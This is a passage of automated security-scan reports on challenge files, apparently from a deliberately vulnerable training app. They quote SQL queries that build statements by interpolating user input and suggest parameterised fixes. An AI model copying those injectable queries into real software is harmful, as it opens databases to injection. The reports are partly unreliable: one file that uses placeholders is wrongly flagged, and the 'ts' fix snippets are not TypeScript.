"risk_level": "Critical"}, {"id": "SECR-M-002", "title": "Prevent Secret Exposure in CI/CD Logs and History", "risk_level": "Critical"}, {"id": "SECR-M-004", "title": "Short-Lived Credentials & Rotation", "risk_level": "Critical"}, {"id": "SECR-M-005", "title": "No Secrets in Build Logs", "risk_level": "Critical"}, {"id": "AUTH-M-003", "title": "Session Management & Timeout Controls", "risk_level": "High"}, {"id": "AUTH-M-004", "title": "Password Reset & Account Recovery", "risk_level": "High"}, {"id": "COOK-M-002", "title": "Cookie Theft Prevention & Rotation", "risk_level": "High"}, {"id": "CORS-M-001", "title": "No Reflected Origin (CORS)", "risk_level": "High"}, {"id": "CRYPT-M-003", "title": "Key Rotation & Lifecycle Management", "risk_level": "High"}, {"id": "CRYPT-M-004", "title": "Algorithm Selection & Post-Quantum Readiness", "risk_level": "High"}, {"id": "CRYPT-M-005", "title": "Certificate Management & Pinning", "risk_level": "High"}, {"id": "CRYPT-M-006", "title": "Hardware Security Module (HSM) for High-Value Keys", "risk_level": "High"}, {"id": "IDOR-M-002", "title": "Opaque Object Identifiers", "risk_level": "High"}, {"id": "IDOR-M-003", "title": "Avoid Exposing IDs in URLs", "risk_level": "High"}, {"id": "IDOR-M-005", "title": "IDOR Test Coverage Matrix", "risk_level": "High"}, {"id": "IDOR-M-006", "title": "Log Authorization Failures", "risk_level": "High"}, {"id": "IDOR-M-007", "title": "Validate Nested Resource Ownership", "risk_level": "High"}, {"id": "LOG-M-001", "title": "Stream Logs to SIEM", "risk_level": "High"}, {"id": "LOG-M-002", "title": "Implement Comprehensive CI/CD Audit Logging", "risk_level": "High"}, {"id": "LOG-M-003", "title": "Configure Centralized Log Aggregation and SIEM Alerting for CI/CD", "risk_level": "High"}, {"id": "LOG-M-004", "title": "Trusted Time Synchronization for Security Events", "risk_level": "High"}, {"id": "SECR-M-003", "title": "Enforce Temporary Credentials and Credential Rotation in CI/CD", "risk_level": "High"}]
-->

---

## SAGF Compliance Scan: `data/static/codefixes/unionSqlInjectionChallenge_1.ts`
**Scanned at**: 2026-10-11T16:33:42.728130+00:00
**Mandard DB coverage**: 64 applicable mandards checked (SECR, SAST, HDR, CORS, INPUT, INJECT…)
**Attestation**: `eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJ0aW1lc3RhbXAiOiA...`

### 🚨 Confirmed Violations (1)
| Sev | Mandard | Title | Line |
|-----|---------|-------|------|
| 🔴 CRITICAL | [DB-M-001](https://verify.example-org.internal/?id=DB-M-001) | SQL query built by string interpolation or concatenation | 6 |

#### [DB-M-001](https://verify.example-org.internal/?id=DB-M-001) — SQL query built by string interpolation or concatenation
```ts
// Line 6
models.sequelize.query(`SELECT * FROM Products WHERE ((name LIKE '%${criteria}%' OR description LIKE '%${criteria}%') AND deletedAt IS NULL) ORDER BY name`)
```
**Suggested fix:**
```ts
# Suggested fix: always use parameterised queries
# WRONG (PHP):  $q = "SELECT * FROM users WHERE id = '$id'";
# WRONG (Py):   query = 'SELECT * FROM users WHERE id = ' + user_id
# Python (psycopg2 / sqlite3):
cursor.execute('SELECT * FROM users WHERE id = %s', (user_id,))
# PHP (PDO):  $s = $pdo->prepare('SELECT * FROM users WHERE id = ?'); $s->execute([$id]);
# Node.js (pg):  pool.query('SELECT * FROM users WHERE id = $1', [userId])
# Java:  PreparedStatement ps = conn.prepareStatement('SELECT * FROM users WHERE id = ?');
#        ps.setInt(1, userId);
```

### ⚠️ Most Relevant Mandards Requiring Tool Verification
_Ranked by relevance to this code. Static scan did not detect violations — use the SAGF Tier 2 toolchain to verify:_

| Risk | Mandard | Title |
|------|---------|-------|
| 🟠 High | [DEP-M-002](https://verify.example-org.internal/?id=DEP-M-002) | Package Manager Lifecycle Script Hardening |
| 🟠 High | [DEP-M-003](https://verify.example-org.internal/?id=DEP-M-003) | Dependency Name-Confusion Defense (Typosquatting, Slopsquatting, Dependency Confusion) |
| 🟠 High | [HDR-M-009](https://verify.example-org.internal/?id=HDR-M-009) | Cache-Control for Sensitive Data |
| 🔴 Critical | [AJAX-M-002](https://verify.example-org.internal/?id=AJAX-M-002) | AJAX Response Sanitization & XSS Prevention |
| 🔴 Critical | [IDOR-M-004](https://verify.example-org.internal/?id=IDOR-M-004) | Context-Aware Data Queries |
| 🔴 Critical | [INJECT-M-002](https://verify.example-org.internal/?id=INJECT-M-002) | OS Command Injection Prevention |
| 🔴 Critical | [INJECT-M-003](https://verify.example-org.internal/?id=INJECT-M-003) | XML External Entity (XXE) Prevention |
| 🟠 High | [AJAX-M-001](https://verify.example-org.internal/?id=AJAX-M-001) | AJAX Request Validation & CSRF Protection |

_+ 56 more applicable mandards — [view all 64 in SAGF UI →](https://verify.example-org.internal/)_

> Run SonarQube, Snyk, Semgrep, and other SAGF Tier 2 tools for comprehensive coverage per SAGF-STD-004.

<!-- CODI_FINDINGS_JSON
[{"mandard_id": "DB-M-001", "severity": "CRITICAL", "line": 6, "message": "SQL query built by string interpolation or concatenation", "fix_snippet": "# Suggested fix: always use parameterised queries\n# WRONG (PHP):  $q = \"SELECT * FROM users WHERE id = '$id'\";\n# WRONG (Py):   query = 'SELECT * FROM users WHERE id = ' + user_id\n# Python (psycopg2 / sqlite3):\ncursor.execute('SELECT * FROM users WHERE id = %s', (user_id,))\n# PHP (PDO):  $s = $pdo->prepare('SELECT * FROM users WHERE id = ?'); $s->execute([$id]);\n# Node.js (pg):  pool.query('SELECT * FROM users WHERE id = $1', [userId])\n# Java:  PreparedStatement ps = conn.prepareStatement('SELECT * FROM users WHERE id = ?');\n#        ps.setInt(1, userId);"}]
-->

<!-- CODI_ADVISORY_JSON
[{"id": "DEP-M-002", "title": "Package Manager Lifecycle Script Hardening", "risk_level": "High"}, {"id": "DEP-M-003", "title": "Dependency Name-Confusion Defense (Typosquatting, Slopsquatting, Dependency Confusion)", "risk_level": "High"}, {"id": "HDR-M-009", "title": "Cache-Control for Sensitive Data", "risk_level": "High"}, {"id": "AJAX-M-002", "title": "AJAX Response Sanitization & XSS Prevention", "risk_level": "Critical"}, {"id": "IDOR-M-004", "title": "Context-Aware Data Queries", "risk_level": "Critical"}, {"id": "INJECT-M-002", "title": "OS Command Injection Prevention", "risk_level": "Critical"}, {"id": "INJECT-M-003", "title": "XML External Entity (XXE) Prevention", "risk_level": "Critical"}, {"id": "AJAX-M-001", "title": "AJAX Request Validation & CSRF Protection", "risk_level": "High"}, {"id": "INJECT-M-001", "title": "LDAP Injection Prevention", "risk_level": "High"}, {"id": "INPUT-M-001", "title": "Whitelist-Based Input Validation", "risk_level": "High"}, {"id": "INPUT-M-002", "title": "Input Encoding & Output Encoding", "risk_level": "High"}, {"id": "DEP-M-001", "title": "Pin Dependency Versions in Production Builds", "risk_level": "Critical"}, {"id": "HDR-M-001", "title": "Enforce X-Content-Type-Options", "risk_level": "Critical"}, {"id": "HDR-M-002", "title": "No Server Banners", "risk_level": "Critical"}, {"id": "HDR-M-003", "title": "Enforce HSTS", "risk_level": "Critical"}, {"id": "HDR-M-005", "title": "Disable Legacy X-XSS-Protection Filter", "risk_level": "Critical"}, {"id": "HDR-M-007", "title": "Enforce Referrer Policy", "risk_level": "Critical"}, {"id": "HDR-M-008", "title": "Enforce Permissions Policy", "risk_level": "Critical"}, {"id": "HDR-M-011", "title": "Cross-Origin-Resource-Policy (CORP)", "risk_level": "Critical"}, {"id": "HDR-M-012", "title": "Cross-Origin-Embedder-Policy (COEP)", "risk_level": "Critical"}, {"id": "HDR-M-014", "title": "Content Security Policy CSP", "risk_level": "Critical"}, {"id": "HDR-M-006", "title": "Enforce Content-Type and Charset", "risk_level": "High"}, {"id": "AUTH-M-001", "title": "Secure Password Hashing", "risk_level": "Critical"}, {"id": "AUTH-M-002", "title": "Multi-Factor Authentication (MFA) Enforcement", "risk_level": "Critical"}, {"id": "COOK-M-001", "title": "Secure Cookie Attributes (HttpOnly, Secure, SameSite)", "risk_level": "Critical"}, {"id": "CRYPT-M-001", "title": "Encryption at Rest", "risk_level": "Critical"}, {"id": "CRYPT-M-002", "title": "Encryption in Transit (TLS 1.3+)", "risk_level": "Critical"}, {"id": "IDOR-M-001", "title": "IDOR Protection", "risk_level": "Critical"}, {"id": "SAST-M-001", "title": "No Critical SAST Findings", "risk_level": "Critical"}, {"id": "SAST-M-002", "title": "Secure File Upload Validation", "risk_level": "Critical"}, {"id": "SAST-M-003", "title": "Disable XXE Processing", "risk_level": "Critical"}, {"id": "SAST-M-004", "title": "Prevent Insecure Deserialization", "risk_level": "Critical"}, {"id": "SAST-M-005", "title": "Prevent Mass Assignment", "risk_level": "Critical"}, {"id": "SAST-M-006", "title": "Native Memory Safety and Unsafe Code Assurance", "risk_level": "Critical"}, {"id": "SECR-M-001", "title": "No Hardcoded Secrets", "risk_level": "Critical"}, {"id": "SECR-M-002", "title": "Prevent Secret Exposure in CI/CD Logs and History", "risk_level": "Critical"}, {"id": "SECR-M-004", "title": "Short-Lived Credentials & Rotation", "risk_level": "Critical"}, {"id": "SECR-M-005", "title": "No Secrets in Build Logs", "risk_level": "Critical"}, {"id": "AUTH-M-003", "title": "Session Management & Timeout Controls", "risk_level": "High"}, {"id": "AUTH-M-004", "title": "Password Reset & Account Recovery", "risk_level": "High"}, {"id": "COOK-M-002", "title": "Cookie Theft Prevention & Rotation", "risk_level": "High"}, {"id": "CORS-M-001", "title": "No Reflected Origin (CORS)", "risk_level": "High"}, {"id": "CRYPT-M-003", "title": "Key Rotation & Lifecycle Management", "risk_level": "High"}, {"id": "CRYPT-M-004", "title": "Algorithm Selection & Post-Quantum Readiness", "risk_level": "High"}, {"id": "CRYPT-M-005", "title": "Certificate Management & Pinning", "risk_level": "High"}, {"id": "CRYPT-M-006", "title": "Hardware Security Module (HSM) for High-Value Keys", "risk_level": "High"}, {"id": "IDOR-M-002", "title": "Opaque Object Identifiers", "risk_level": "High"}, {"id": "IDOR-M-003", "title": "Avoid Exposing IDs in URLs", "risk_level": "High"}, {"id": "IDOR-M-005", "title": "IDOR Test Coverage Matrix", "risk_level": "High"}, {"id": "IDOR-M-006", "title": "Log Authorization Failures", "risk_level": "High"}, {"id": "IDOR-M-007", "title": "Validate Nested Resource Ownership", "risk_level": "High"}, {"id": "LOG-M-001", "title": "Stream Logs to SIEM", "risk_level": "High"}, {"id": "LOG-M-002", "title": "Implement Comprehensive CI/CD Audit Logging", "risk_level": "High"}, {"id": "LOG-M-003", "title": "Configure Centralized Log Aggregation and SIEM Alerting for CI/CD", "risk_level": "High"}, {"id": "LOG-M-004", "title": "Trusted Time Synchronization for Security Events", "risk_level": "High"}, {"id": "SECR-M-003", "title": "Enforce Temporary Credentials and Credential Rotation in CI/CD", "risk_level": "High"}]
-->

---

## SAGF Compliance Scan: `data/static/codefixes/loginJimChallenge_4.ts`
**Scanned at**: 2026-10-11T16:33:50.390438+00:00
**Mandard DB coverage**: 64 applicable mandards checked (SECR, SAST, HDR, CORS, INPUT, INJECT…)
**Attestation**: `eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJ0aW1lc3RhbXAiOiA...`

### 🚨 Confirmed Violations (1)
| Sev | Mandard | Title | Line |
|-----|---------|-------|------|
| 🔴 CRITICAL | [DB-M-001](https://verify.example-org.internal/?id=DB-M-001) | SQL query built by string interpolation or concatenation | 18 |

#### [DB-M-001](https://verify.example-org.internal/?id=DB-M-001) — SQL query built by string interpolation or concatenation
```ts
// Line 18
models.sequelize.query(`SELECT * FROM Users WHERE email = '${req.body.email || ''}' AND password = '${security.hash(req.body.password || '')}' AND deletedAt IS NULL`, { model: models.User, plain: t...
```
**Suggested fix:**
```ts
# Suggested fix: always use parameterised queries
# WRONG (PHP):  $q = "SELECT * FROM users WHERE id = '$id'";
# WRONG (Py):   query = 'SELECT * FROM users WHERE id = ' + user_id
# Python (psycopg2 / sqlite3):
cursor.execute('SELECT * FROM users WHERE id = %s', (user_id,))
# PHP (PDO):  $s = $pdo->prepare('SELECT * FROM users WHERE id = ?'); $s->execute([$id]);
# Node.js (pg):  pool.query('SELECT * FROM users WHERE id = $1', [userId])
# Java:  PreparedStatement ps = conn.prepareStatement('SELECT * FROM users WHERE id = ?');
#        ps.setInt(1, userId);
```

### ⚠️ Most Relevant Mandards Requiring Tool Verification
_Ranked by relevance to this code. Static scan did not detect violations — use the SAGF Tier 2 toolchain to verify:_

| Risk | Mandard | Title |
|------|---------|-------|
| 🔴 Critical | [AUTH-M-002](https://verify.example-org.internal/?id=AUTH-M-002) | Multi-Factor Authentication (MFA) Enforcement |
| 🔴 Critical | [AUTH-M-001](https://verify.example-org.internal/?id=AUTH-M-001) | Secure Password Hashing |
| 🟠 High | [AUTH-M-004](https://verify.example-org.internal/?id=AUTH-M-004) | Password Reset & Account Recovery |
| 🔴 Critical | [SECR-M-002](https://verify.example-org.internal/?id=SECR-M-002) | Prevent Secret Exposure in CI/CD Logs and History |
| 🔴 Critical | [IDOR-M-004](https://verify.example-org.internal/?id=IDOR-M-004) | Context-Aware Data Queries |
| 🔴 Critical | [INJECT-M-002](https://verify.example-org.internal/?id=INJECT-M-002) | OS Command Injection Prevention |
| 🟠 High | [AUTH-M-003](https://verify.example-org.internal/?id=AUTH-M-003) | Session Management & Timeout Controls |
| 🟠 High | [INJECT-M-001](https://verify.example-org.internal/?id=INJECT-M-001) | LDAP Injection Prevention |

_+ 56 more applicable mandards — [view all 64 in SAGF UI →](https://verify.example-org.internal/)_

> Run SonarQube, Snyk, Semgrep, and other SAGF Tier 2 tools for comprehensive coverage per SAGF-STD-004.

<!-- CODI_FINDINGS_JSON
[{"mandard_id": "DB-M-001", "severity": "CRITICAL", "line": 18, "message": "SQL query built by string interpolation or concatenation", "fix_snippet": "# Suggested fix: always use parameterised queries\n# WRONG (PHP):  $q = \"SELECT * FROM users WHERE id = '$id'\";\n# WRONG (Py):   query = 'SELECT * FROM users WHERE id = ' + user_id\n# Python (psycopg2 / sqlite3):\ncursor.execute('SELECT * FROM users WHERE id = %s', (user_id,))\n# PHP (PDO):  $s = $pdo->prepare('SELECT * FROM users WHERE id = ?'); $s->execute([$id]);\n# Node.js (pg):  pool.query('SELECT * FROM users WHERE id = $1', [userId])\n# Java:  PreparedStatement ps = conn.prepareStatement('SELECT * FROM users WHERE id = ?');\n#        ps.setInt(1, userId);"}]
-->

<!-- CODI_ADVISORY_JSON
[{"id": "AUTH-M-002", "title": "Multi-Factor Authentication (MFA) Enforcement", "risk_level": "Critical"}, {"id": "AUTH-M-001", "title": "Secure Password Hashing", "risk_level": "Critical"}, {"id": "AUTH-M-004", "title": "Password Reset & Account Recovery", "risk_level": "High"}, {"id": "SECR-M-002", "title": "Prevent Secret Exposure in CI/CD Logs and History", "risk_level": "Critical"}, {"id": "IDOR-M-004", "title": "Context-Aware Data Queries", "risk_level": "Critical"}, {"id": "INJECT-M-002", "title": "OS Command Injection Prevention", "risk_level": "Critical"}, {"id": "AUTH-M-003", "title": "Session Management & Timeout Controls", "risk_level": "High"}, {"id": "INJECT-M-001", "title": "LDAP Injection Prevention", "risk_level": "High"}, {"id": "HDR-M-001", "title": "Enforce X-Content-Type-Options", "risk_level": "Critical"}, {"id": "HDR-M-011", "title": "Cross-Origin-Resource-Policy (CORP)", "risk_level": "Critical"}, {"id": "HDR-M-012", "title": "Cross-Origin-Embedder-Policy (COEP)", "risk_level": "Critical"}, {"id": "HDR-M-014", "title": "Content Security Policy CSP", "risk_level": "Critical"}, {"id": "SECR-M-001", "title": "No Hardcoded Secrets", "risk_level": "Critical"}, {"id": "SECR-M-004", "title": "Short-Lived Credentials & Rotation", "risk_level": "Critical"}, {"id": "SECR-M-005", "title": "No Secrets in Build Logs", "risk_level": "Critical"}, {"id": "CORS-M-001", "title": "No Reflected Origin (CORS)", "risk_level": "High"}, {"id": "CRYPT-M-006", "title": "Hardware Security Module (HSM) for High-Value Keys", "risk_level": "High"}, {"id": "HDR-M-006", "title": "Enforce Content-Type and Charset", "risk_level": "High"}, {"id": "HDR-M-009", "title": "Cache-Control for Sensitive Data", "risk_level": "High"}, {"id": "INPUT-M-001", "title": "Whitelist-Based Input Validation", "risk_level": "High"}, {"id": "INPUT-M-002", "title": "Input Encoding & Output Encoding", "risk_level": "High"}, {"id": "LOG-M-004", "title": "Trusted Time Synchronization for Security Events", "risk_level": "High"}, {"id": "SECR-M-003", "title": "Enforce Temporary Credentials and Credential Rotation in CI/CD", "risk_level": "High"}, {"id": "AJAX-M-002", "title": "AJAX Response Sanitization & XSS Prevention", "risk_level": "Critical"}, {"id": "IDOR-M-001", "title": "IDOR Protection", "risk_level": "Critical"}, {"id": "INJECT-M-003", "title": "XML External Entity (XXE) Prevention", "risk_level": "Critical"}, {"id": "AJAX-M-001", "title": "AJAX Request Validation & CSRF Protection", "risk_level": "High"}, {"id": "IDOR-M-002", "title": "Opaque Object Identifiers", "risk_level": "High"}, {"id": "IDOR-M-003", "title": "Avoid Exposing IDs in URLs", "risk_level": "High"}, {"id": "IDOR-M-005", "title": "IDOR Test Coverage Matrix", "risk_level": "High"}, {"id": "IDOR-M-006", "title": "Log Authorization Failures", "risk_level": "High"}, {"id": "IDOR-M-007", "title": "Validate Nested Resource Ownership", "risk_level": "High"}, {"id": "CRYPT-M-001", "title": "Encryption at Rest", "risk_level": "Critical"}, {"id": "CRYPT-M-002", "title": "Encryption in Transit (TLS 1.3+)", "risk_level": "Critical"}, {"id": "DEP-M-001", "title": "Pin Dependency Versions in Production Builds", "risk_level": "Critical"}, {"id": "HDR-M-002", "title": "No Server Banners", "risk_level": "Critical"}, {"id": "HDR-M-003", "title": "Enforce HSTS", "risk_level": "Critical"}, {"id": "HDR-M-005", "title": "Disable Legacy X-XSS-Protection Filter", "risk_level": "Critical"}, {"id": "HDR-M-007", "title": "Enforce Referrer Policy", "risk_level": "Critical"}, {"id": "HDR-M-008", "title": "Enforce Permissions Policy", "risk_level": "Critical"}, {"id": "CRYPT-M-003", "title": "Key Rotation & Lifecycle Management", "risk_level": "High"}, {"id": "CRYPT-M-004", "title": "Algorithm Selection & Post-Quantum Readiness", "risk_level": "High"}, {"id": "CRYPT-M-005", "title": "Certificate Management & Pinning", "risk_level": "High"}, {"id": "DEP-M-002", "title": "Package Manager Lifecycle Script Hardening", "risk_level": "High"}, {"id": "DEP-M-003", "title": "Dependency Name-Confusion Defense (Typosquatting, Slopsquatting, Dependency Confusion)", "risk_level": "High"}, {"id": "LOG-M-001", "title": "Stream Logs to SIEM", "risk_level": "High"}, {"id": "LOG-M-002", "title": "Implement Comprehensive CI/CD Audit Logging", "risk_level": "High"}, {"id": "LOG-M-003", "title": "Configure Centralized Log Aggregation and SIEM Alerting for CI/CD", "risk_level": "High"}, {"id": "COOK-M-001", "title": "Secure Cookie Attributes (HttpOnly, Secure, SameSite)", "risk_level": "Critical"}, {"id": "SAST-M-001", "title": "No Critical SAST Findings", "risk_level": "Critical"}, {"id": "SAST-M-002", "title": "Secure File Upload Validation", "risk_level": "Critical"}, {"id": "SAST-M-003", "title": "Disable XXE Processing", "risk_level": "Critical"}, {"id": "SAST-M-004", "title": "Prevent Insecure Deserialization", "risk_level": "Critical"}, {"id": "SAST-M-005", "title": "Prevent Mass Assignment", "risk_level": "Critical"}, {"id": "SAST-M-006", "title": "Native Memory Safety and Unsafe Code Assurance", "risk_level": "Critical"}, {"id": "COOK-M-002", "title": "Cookie Theft Prevention & Rotation", "risk_level": "High"}]
-->

---

## SAGF Compliance Scan: `data/static/codefixes/loginJimChallenge_2.ts`
**Scanned at**: 2026-10-11T16:33:50.519994+00:00
**Mandard DB coverage**: 64 applicable mandards checked (SECR, SAST, HDR, CORS, INPUT, INJECT…)
**Attestation**: `eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJ0aW1lc3RhbXAiOiA...`

### 🚨 Confirmed Violations (1)
| Sev | Mandard | Title | Line |
|-----|---------|-------|------|
| 🔴 CRITICAL | [DB-M-001](https://verify.example-org.internal/?id=DB-M-001) | SQL query built by string interpolation or concatenation | 15 |

#### [DB-M-001](https://verify.example-org.internal/?id=DB-M-001) — SQL query built by string interpolation or concatenation
```ts
// Line 15
models.sequelize.query(`SELECT * FROM Users WHERE email = '${req.body.email || ''}' AND password = '${security.hash(req.body.password || '')}' AND deletedAt IS NULL`, { model: models.User, plain: f...
```
**Suggested fix:**
```ts
# Suggested fix: always use parameterised queries
# WRONG (PHP):  $q = "SELECT * FROM users WHERE id = '$id'";
# WRONG (Py):   query = 'SELECT * FROM users WHERE id = ' + user_id
# Python (psycopg2 / sqlite3):
cursor.execute('SELECT * FROM users WHERE id = %s', (user_id,))
# PHP (PDO):  $s = $pdo->prepare('SELECT * FROM users WHERE id = ?'); $s->execute([$id]);
# Node.js (pg):  pool.query('SELECT * FROM users WHERE id = $1', [userId])
# Java:  PreparedStatement ps = conn.prepareStatement('SELECT * FROM users WHERE id = ?');
#        ps.setInt(1, userId);
```

### ⚠️ Most Relevant Mandards Requiring Tool Verification
_Ranked by relevance to this code. Static scan did not detect violations — use the SAGF Tier 2 toolchain to verify:_

| Risk | Mandard | Title |
|------|---------|-------|
| 🔴 Critical | [AUTH-M-002](https://verify.example-org.internal/?id=AUTH-M-002) | Multi-Factor Authentication (MFA) Enforcement |
| 🔴 Critical | [AUTH-M-001](https://verify.example-org.internal/?id=AUTH-M-001) | Secure Password Hashing |
| 🟠 High | [AUTH-M-004](https://verify.example-org.internal/?id=AUTH-M-004) | Password Reset & Account Recovery |
| 🔴 Critical | [SECR-M-002](https://verify.example-org.internal/?id=SECR-M-002) | Prevent Secret Exposure in CI/CD Logs and History |
| 🔴 Critical | [IDOR-M-004](https://verify.example-org.internal/?id=IDOR-M-004) | Context-Aware Data Queries |
| 🟠 High | [AUTH-M-003](https://verify.example-org.internal/?id=AUTH-M-003) | Session Management & Timeout Controls |
| 🔴 Critical | [HDR-M-001](https://verify.example-org.internal/?id=HDR-M-001) | Enforce X-Content-Type-Options |
| 🔴 Critical | [HDR-M-011](https://verify.example-org.internal/?id=HDR-M-011) | Cross-Origin-Resource-Policy (CORP) |

_+ 56 more applicable mandards — [view all 64 in SAGF UI →](https://verify.example-org.internal/)_

> Run SonarQube, Snyk, Semgrep, and other SAGF Tier 2 tools for comprehensive coverage per SAGF-STD-004.

<!-- CODI_FINDINGS_JSON
[{"mandard_id": "DB-M-001", "severity": "CRITICAL", "line": 15, "message": "SQL query built by string interpolation or concatenation", "fix_snippet": "# Suggested fix: always use parameterised queries\n# WRONG (PHP):  $q = \"SELECT * FROM users WHERE id = '$id'\";\n# WRONG (Py):   query = 'SELECT * FROM users WHERE id = ' + user_id\n# Python (psycopg2 / sqlite3):\ncursor.execute('SELECT * FROM users WHERE id = %s', (user_id,))\n# PHP (PDO):  $s = $pdo->prepare('SELECT * FROM users WHERE id = ?'); $s->execute([$id]);\n# Node.js (pg):  pool.query('SELECT * FROM users WHERE id = $1', [userId])\n# Java:  PreparedStatement ps = conn.prepareStatement('SELECT * FROM users WHERE id = ?');\n#        ps.setInt(1, userId);"}]
-->

<!-- CODI_ADVISORY_JSON
[{"id": "AUTH-M-002", "title": "Multi-Factor Authentication (MFA) Enforcement", "risk_level": "Critical"}, {"id": "AUTH-M-001", "title": "Secure Password Hashing", "risk_level": "Critical"}, {"id": "AUTH-M-004", "title": "Password Reset & Account Recovery", "risk_level": "High"}, {"id": "SECR-M-002", "title": "Prevent Secret Exposure in CI/CD Logs and History", "risk_level": "Critical"}, {"id": "IDOR-M-004", "title": "Context-Aware Data Queries", "risk_level": "Critical"}, {"id": "AUTH-M-003", "title": "Session Management & Timeout Controls", "risk_level": "High"}, {"id": "HDR-M-001", "title": "Enforce X-Content-Type-Options", "risk_level": "Critical"}, {"id": "HDR-M-011", "title": "Cross-Origin-Resource-Policy (CORP)", "risk_level": "Critical"}, {"id": "HDR-M-012", "title": "Cross-Origin-Embedder-Policy (COEP)", "risk_level": "Critical"}, {"id": "HDR-M-014", "title": "Content Security Policy CSP", "risk_level": "Critical"}, {"id": "SECR-M-001", "title": "No Hardcoded Secrets", "risk_level": "Critical"}, {"id": "SECR-M-004", "title": "Short-Lived Credentials & Rotation", "risk_level": "Critical"}, {"id": "SECR-M-005", "title": "No Secrets in Build Logs", "risk_level": "Critical"}, {"id": "CORS-M-001", "title": "No Reflected Origin (CORS)", "risk_level": "High"}, {"id": "CRYPT-M-006", "title": "Hardware Security Module (HSM) for High-Value Keys", "risk_level": "High"}, {"id": "HDR-M-006", "title": "Enforce Content-Type and Charset", "risk_level": "High"}, {"id": "HDR-M-009", "title": "Cache-Control for Sensitive Data", "risk_level": "High"}, {"id": "INPUT-M-001", "title": "Whitelist-Based Input Validation", "risk_level": "High"}, {"id": "INPUT-M-002", "title": "Input Encoding & Output Encoding", "risk_level": "High"}, {"id": "LOG-M-004", "title": "Trusted Time Synchronization for Security Events", "risk_level": "High"}, {"id": "SECR-M-003", "title": "Enforce Temporary Credentials and Credential Rotation in CI/CD", "risk_level": "High"}, {"id": "AJAX-M-002", "title": "AJAX Response Sanitization & XSS Prevention", "risk_level": "Critical"}, {"id": "IDOR-M-001", "title": "IDOR Protection", "risk_level": "Critical"}, {"id": "INJECT-M-002", "title": "OS Command Injection Prevention", "risk_level": "Critical"}, {"id": "INJECT-M-003", "title": "XML External Entity (XXE) Prevention", "risk_level": "Critical"}, {"id": "AJAX-M-001", "title": "AJAX Request Validation & CSRF Protection", "risk_level": "High"}, {"id": "IDOR-M-002", "title": "Opaque Object Identifiers", "risk_level": "High"}, {"id": "IDOR-M-003", "title": "Avoid Exposing IDs in URLs", "risk_level": "High"}, {"id": "IDOR-M-005", "title": "IDOR Test Coverage Matrix", "risk_level": "High"}, {"id": "IDOR-M-006", "title": "Log Authorization Failures", "risk_level": "High"}, {"id": "IDOR-M-007", "title": "Validate Nested Resource Ownership", "risk_level": "High"}, {"id": "INJECT-M-001", "title": "LDAP Injection Prevention", "risk_level": "High"}, {"id": "CRYPT-M-001", "title": "Encryption at Rest", "risk_level": "Critical"}, {"id": "CRYPT-M-002", "title": "Encryption in Transit (TLS 1.3+)", "risk_level": "Critical"}, {"id": "DEP-M-001", "title": "Pin Dependency Versions in Production Builds", "risk_level": "Critical"}, {"id": "HDR-M-002", "title": "No Server Banners", "risk_level": "Critical"}, {"id": "HDR-M-003", "title": "Enforce HSTS", "risk_level": "Critical"}, {"id": "HDR-M-005", "title": "Disable Legacy X-XSS-Protection Filter", "risk_level": "Critical"}, {"id": "HDR-M-007", "title": "Enforce Referrer Policy", "risk_level": "Critical"}, {"id": "HDR-M-008", "title": "Enforce Permissions Policy", "risk_level": "Critical"}, {"id": "CRYPT-M-003", "title": "Key Rotation & Lifecycle Management", "risk_level": "High"}, {"id": "CRYPT-M-004", "title": "Algorithm Selection & Post-Quantum Readiness", "risk_level": "High"}, {"id": "CRYPT-M-005", "title": "Certificate Management & Pinning", "risk_level": "High"}, {"id": "DEP-M-002", "title": "Package Manager Lifecycle Script Hardening", "risk_level": "High"}, {"id": "DEP-M-003", "title": "Dependency Name-Confusion Defense (Typosquatting, Slopsquatting, Dependency Confusion)", "risk_level": "High"}, {"id": "LOG-M-001", "title": "Stream Logs to SIEM", "risk_level": "High"}, {"id": "LOG-M-002", "title": "Implement Comprehensive CI/CD Audit Logging", "risk_level": "High"}, {"id": "LOG-M-003", "title": "Configure Centralized Log Aggregation and SIEM Alerting for CI/CD", "risk_level": "High"}, {"id": "COOK-M-001", "title": "Secure Cookie Attributes (HttpOnly, Secure, SameSite)", "risk_level": "Critical"}, {"id": "SAST-M-001", "title": "No Critical SAST Findings", "risk_level": "Critical"}, {"id": "SAST-M-002", "title": "Secure File Upload Validation", "risk_level": "Critical"}, {"id": "SAST-M-003", "title": "Disable XXE Processing", "risk_level": "Critical"}, {"id": "SAST-M-004", "title": "Prevent Insecure Deserialization", "risk_level": "Critical"}, {"id": "SAST-M-005", "title": "Prevent Mass Assignment", "risk_level": "Critical"}, {"id": "SAST-M-006", "title": "Native Memory Safety and Unsafe Code Assurance", "risk_level": "Critical"}, {"id": "COOK-M-002", "title": "Cookie Theft Prevention & Rotation", "risk_level": "High"}]
-->

---

## SAGF Compliance Scan: `data/static/codefixes/loginJimChallenge_1_correct.ts`
**Scanned at**: 2026-10-11T16:33:50.948147+00:00
**Mandard DB coverage**: 64 applicable mandards checked (SECR, SAST, HDR, CORS, INPUT, INJECT…)
**Attestation**: `eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJ0aW1lc3RhbXAiOiA...`

### 🚨 Confirmed Violations (1)
| Sev | Mandard | Title | Line |
|-----|---------|-------|------|
| 🔴 CRITICAL | [DB-M-001](https://verify.example-org.internal/?id=DB-M-001) | SQL query built by string interpolation or concatenation | 15 |

#### [DB-M-001](https://verify.example-org.internal/?id=DB-M-001) — SQL query built by string interpolation or concatenation
```ts
// Line 15
models.sequelize.query(`SELECT * FROM Users WHERE email = $1 AND password = $2 AND deletedAt IS NULL`,
```
**Suggested fix:**
```ts
# Suggested fix: always use parameterised queries
# WRONG (PHP):  $q = "SELECT * FROM users WHERE id = '$id'";
# WRONG (Py):   query = 'SELECT * FROM users WHERE id = ' + user_id
# Python (psycopg2 / sqlite3):
cursor.execute('SELECT * FROM users WHERE id = %s', (user_id,))
# PHP (PDO):  $s = $pdo->prepare('SELECT * FROM users WHERE id = ?'); $s->execute([$id]);
# Node.js (pg):  pool.query('SELECT * FROM users WHERE id = $1', [userId])
# Java:  PreparedStatement ps = conn.prepareStatement('SELECT * FROM users WHERE id = ?');
#        ps.setInt(1, userId);
```

### ⚠️ Most Relevant Mandards Requiring Tool Verification
_Ranked by relevance to this code. Static scan did not detect violations — use the SAGF Tier 2 toolchain to verify:_

